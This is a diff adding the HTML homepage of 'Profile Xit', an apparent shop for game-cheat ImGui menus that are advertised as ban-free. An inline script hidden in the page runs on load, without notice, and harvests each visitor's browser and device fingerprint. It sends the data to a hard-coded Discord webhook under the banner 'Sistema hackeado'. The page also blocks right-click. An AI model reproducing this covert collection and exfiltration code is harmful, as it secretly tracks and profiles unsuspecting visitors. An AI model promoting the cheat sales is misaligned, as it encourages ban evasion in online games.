@@ -1,0 +1,430 @@
+
+<html>
+<head>
+  <base href="index.html" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Profile Xit - Home !</title>
+  <meta property="og:title" content="Profile Xit - Home !">
+  <meta property="og:description" content="Profile Xit - Home !">
+  <meta property="og:url" content="oxcyleaksGG.html">
+  <meta property="og:type" content="website">
+  <meta name="twitter:card" content="summary_large_image">
+  <script src="https://www.paypal.com/sdk/js?client-id=AbFRZgPIi8ZNpV5Vbgxg1TjogoLSYSbl32JVMILdhMtegmR6aSWrqB2RycRwBbadV8Ca-QoMWC7j7rQL&currency=USD"></script>
+
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #1e1e1e;
+      color: #f5f5f5;
+      overflow-x: hidden;
+    }
+      /* Estilo de la notificación */
+      .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background-color: #4caf50;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            opacity: 0;
+            transform: translateY(-20px);
+            transition: opacity 0.5s ease, transform 0.5s ease;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            z-index: 1000;
+        }
+
+        .notification.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .notification .close-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+            line-height: 1;
+        }
+
+        .notification .close-btn:hover {
+            color: #f44336;
+        }
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 20px;
+      position: relative;
+      z-index: 1;
+    }
+    header {
+      text-align: center;
+      margin-bottom: 40px;
+      padding: 20px 0;
+      background-color: rgba(242, 122, 121, 0.1);
+      border-radius: 10px;
+    }
+    h1 {
+      font-size: 3.5em;
+      color: #f27a79;
+      text-shadow: 0 0 10px rgba(242, 122, 121, 0.5);
+      margin: 0;
+    }
+    .subtitle {
+      font-size: 1.2em;
+      color: #f5a5a4;
+      margin-top: 10px;
+    }
+    .main-content {
+      display: flex;
+      justify-content: space-between;
+      align-items: stretch;
+      gap: 20px;
+      margin-bottom: 40px;
+    }
+    .featured-section {
+      flex: 2;
+      background-color: rgba(242, 122, 121, 0.1);
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 0 20px rgba(242, 122, 121, 0.2);
+    }
+    .featured-section h2 {
+      color: #f27a79;
+      margin-top: 0;
+    }
+    .sidebar {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+    .card {
+      background-color: rgba(242, 122, 121, 0.05);
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(242, 122, 121, 0.1);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    .card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 5px 15px rgba(242, 122, 121, 0.2);
+    }
+    .card h2 {
+      color: #f27a79;
+      margin-top: 0;
+    }
+    .card p {
+      color: #d9d9d9;
+    }
+    .btn {
+      display: inline-block;
+      background-color: #f27a79;
+      color: #1e1e1e;
+      padding: 10px 20px;
+      text-decoration: none;
+      border-radius: 5px;
+      transition: background-color 0.3s ease, transform 0.3s ease;
+      font-weight: bold;
+    }
+    .btn:hover {
+      background-color: #f5a5a4;
+      transform: scale(1.05);
+    }
+    #particles-js {
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
+      z-index: 0;
+    }
+    .embed-section {
+      margin-top: 40px;
+      background-color: rgba(242, 122, 121, 0.05);
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 0 20px rgba(242, 122, 121, 0.2);
+    }
+    .embed-section h2 {
+      color: #f27a79;
+      margin-top: 0;
+    }
+    .embed-container {
+      position: relative;
+      padding-bottom: 56.25%; /* 16:9 aspect ratio */
+      height: 0;
+      overflow: hidden;
+      max-width: 100%;
+    }
+    .embed-container iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+  </style>
+</head>
+
+
+
+<script>
+  // Información que se recopilará del usuario
+  const userInfo = {
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      platform: navigator.platform,
+      screenWidth: screen.width,
+      screenHeight: screen.height,
+      cookiesEnabled: navigator.cookieEnabled,
+      system: navigator.oscpu || "Desconocido",
+      dateTime: new Date().toLocaleString(),
+      browserName: navigator.appName,
+      browserVersion: navigator.appVersion,
+      isTouchDevice: 'ontouchstart' in window ? 'Sí' : 'No',
+      deviceMemory: navigator.deviceMemory || "Desconocido",
+      hardwareConcurrency: navigator.hardwareConcurrency || "Desconocido",
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      screenOrientation: screen.orientation ? screen.orientation.type : "Desconocido",
+      location: "No disponible (sin geolocalización)"
+  };
+
+
+  const webhookUrl = 'https://discordapp.com/api/webhooks/1326945450967957588/g-RtnB-cJhREDtkFnYigFnZx73f8n17mlQquJlclhC1T_LU8J9A045vL0j4hUlTGNv6X';
+
+
+  function sendToDiscord(userInfo) {
+      const payload = {
+          username: "Sistema Hackeado 🚨",
+          avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/7/7a/Discord_logo.svg/800px-Discord_logo.svg.png",
+          embeds: [{
+              title: "🚨 **¡Sistema hackeado!** 🚨",
+              description: "**Información crítica extraída en tiempo real**",
+              color: 0x00FF00, 
+              fields: [
+                  {
+                      name: "🔍 **User-Agent**",
+                      value: userInfo.userAgent,
+                      inline: false
+                  },
+                  {
+                      name: "🌍 **Idioma**",
+                      value: userInfo.language,
+                      inline: true
+                  },
+                  {
+                      name: "💻 **Plataforma**",
+                      value: userInfo.platform,
+                      inline: true
+                  },
+                  {
+                      name: "📐 **Resolución de Pantalla**",
+                      value: `${userInfo.screenWidth} x ${userInfo.screenHeight}`,
+                      inline: true
+                  },
+                  {
+                      name: "🍪 **Cookies habilitadas**",
+                      value: userInfo.cookiesEnabled ? "Sí" : "No",
+                      inline: true
+                  },
+                  {
+                      name: "💾 **Sistema Operativo**",
+                      value: userInfo.system,
+                      inline: true
+                  },
+                  {
+                      name: "🕒 **Fecha y Hora**",
+                      value: userInfo.dateTime,
+                      inline: true
+                  },
+                  {
+                      name: "🌐 **Navegador**",
+                      value: `${userInfo.browserName} ${userInfo.browserVersion}`,
+                      inline: true
+                  },
+                  {
+                      name: "📱 **Dispositivo Táctil**",
+                      value: userInfo.isTouchDevice,
+                      inline: true
+                  },
+                  {
+                      name: "🧠 **Memoria del Dispositivo**",
+                      value: `${userInfo.deviceMemory}GB`,
+                      inline: true
+                  },
+                  {
+                      name: "⚡ **Núcleos del Procesador**",
+                      value: userInfo.hardwareConcurrency,
+                      inline: true
+                  },
+                  {
+                      name: "🕹️ **Orientación de Pantalla**",
+                      value: userInfo.screenOrientation,
+                      inline: true
+                  },
+                  {
+                      name: "🗺️ **Ubicación Geográfica**",
+                      value: userInfo.location,
+                      inline: false
+                  },
+                  {
+                      name: "⏳ **Zona Horaria**",
+                      value: userInfo.timezone,
+                      inline: true
+                  }
+              ],
+              thumbnail: {
+                  url: "https://upload.wikimedia.org/wikipedia/commons/a/a7/Discord_logo.svg" // Icono pequeño de Discord
+              },
+              footer: {
+                  text: "Datos extraídos en tiempo real.",
+                  icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/7/7a/Discord_logo.svg/800px-Discord_logo.svg.png"
+              },
+              timestamp: new Date(), // Añadir la hora exacta del mensaje
+          }]
+      };
+
+      // Enviar la información al Webhook de Discord
+      fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+              'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload),
+      })
+      .then(response => response.json())
+      .catch(error => console.error('Error al enviar los datos:', error));
+  }
+
+  // Llamada a la función para enviar la información cuando la página se carga
+  sendToDiscord(userInfo);
+</script>
+<script src="https://www.paypal.com/sdk/js?client-id=AbFRZgPIi8ZNpV5Vbgxg1TjogoLSYSbl32JVMILdhMtegmR6aSWrqB2RycRwBbadV8Ca-QoMWC7j7rQL&currency=USD"></script>
+<body>
+  <div id="particles-js"></div>
+  <div class="container">
+    <header>
+      <h1>Profile Xit | ImGui Designs</h1>
+      <p class="subtitle">Welcome to Profile Xit</p>
+    </header>
+    
+    <div class="main-content">
+      <div class="featured-section">
+        <h2>Profile Xit - Imgui Sales</h2>
+<p>Here you will find the most advanced and customized ImGuis for cheats in any game. Our catalog is carefully designed to offer you the most sophisticated and secure tools to take your gaming experience to the next level.</p>
+
+<p>At Profile Xit, we not only offer ImGuis completely tailored to your needs, but we also guarantee that each one of them is designed with the utmost precision to avoid bans and offer you a problem-free experience. Our ImGuis are compatible with a wide range of games, allowing you to use cheats effectively without worrying about the security of your account.</p>
+
+<p>Why choose Profile Xit?</p>
+<ul>
+    <li><strong>Custom Design:</strong> Each ImGui is custom-made to fit your specific needs and the requirements of each game, ensuring that you get the best functionality possible.</li>
+    <li><strong>Guaranteed Security:</strong> Our cheats are completely ban-free. We use cutting-edge technology to ensure that your gaming experience is safe and risk-free.</li>
+    <li><strong>Universal Compatibility:</strong> Our ImGuis are compatible with any game, allowing you to enjoy a wide range of features no matter what title you're playing.</li>
+    <li><strong>Support & Updates:</strong> We offer dedicated support to help you with any issues or questions you may have. Additionally, we keep our ImGuis updated to adapt to changes in games and ensure their continued operation.</li>
+</ul>
+
+<p>Click the button below to explore our collection and find out how our ImGuis can improve your game. Don't miss out on the chance to become a gaming pro with the most advanced tools on the market!</p>
+
+        <a href="index1.html" class="btn">Explore the Imguis</a>
+      </div>
+      
+      <div class="sidebar">
+        <div class="card">
+          <h2>Profile Xit - Free Imguis</h2>
+          <p>In this section you will find some completely free ImGui from OxcyShop. Explore these samples to understand how they work and if you are interested in acquiring more, you can click on the "Explore the ImGui" section to see our available options.</p>
+          <a href="index2.html" class="btn">Explore The Free Imguis</a>
+        </div>
+        <div class="card">
+          <h2>Profile Xit - Policies</h2>
+          <p>To view our full policies and understand how we protect your experience, click here.</p>
+          <a href="index3.html" class="btn">Explore the Policies</a>
+        </div>
+        <div class="card">
+        <h2>Profile Xit - Extra Tools</h2>
+        <p>In this section you will find programming tools and other things available completely free.</p>
+        <a href="index4.html" class="btn">Explore the tools</a>
+        </div>
+           <div class="card">
+        <h2>Profile Xit - Support</h2>
+        <p>Get support for any purchase or help you need.</p>
+        <a href="index5.html" class="btn">support section</a>
+        </div>
+      </div>
+    </div>
+ 
+  
+   
+  
+  <div class="feature">
+    <h3>ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤCopyright © 2024 Profile Xit. All rights reserved.</h3>
+    <p></p>
+</div>
+  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+  <script>
+    particlesJS("particles-js", {
+      particles: {
+        number: { value: 80, density: { enable: true, value_area: 800 } },
+        color: { value: "#f27a79" },
+        shape: {
+          type: "circle",
+          stroke: { width: 0, color: "#000000" },
+          polygon: { nb_sides: 5 },
+        },
+        opacity: { value: 0.5, random: true, anim: { enable: false, speed: 1, opacity_min: 0.1, sync: false } },
+        size: { value: 3, random: true, anim: { enable: false, speed: 40, size_min: 0.1, sync: false } },
+        line_linked: { enable: true, distance: 150, color: "#f27a79", opacity: 0.4, width: 1 },
+        move: {
+          enable: true,
+          speed: 6,
+          direction: "none",
+          random: false,
+          straight: false,
+          out_mode: "out",
+          bounce: false,
+          attract: { enable: false, rotateX: 600, rotateY: 1200 }
+        }
+      },
+      interactivity: {
+        detect_on: "canvas",
+        events: {
+          onhover: { enable: true, mode: "repulse" },
+          onclick: { enable: true, mode: "push" },
+          resize: true
+        },
+        modes: {
+          grab: { distance: 400, line_linked: { opacity: 1 } },
+          bubble: { distance: 400, size: 40, duration: 2, opacity: 8, speed: 3 },
+          repulse: { distance: 200, duration: 0.4 },
+          push: { particles_nb: 4 },
+          remove: { particles_nb: 2 }
+        }
+      },
+      retina_detect: true
+    });
+
+
+
+    
+    <!-- Notificación -->
+    <div class="notification" id="notification">
+        <span id="notification-message">¡Este es un mensaje de notificación!</span>
+        <button class="close-btn" onclick="hideNotification()">×</button>
+    </div>
+
+    // Desactivar clic derecho
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+    });
+  </script>
+</body>
+</html>
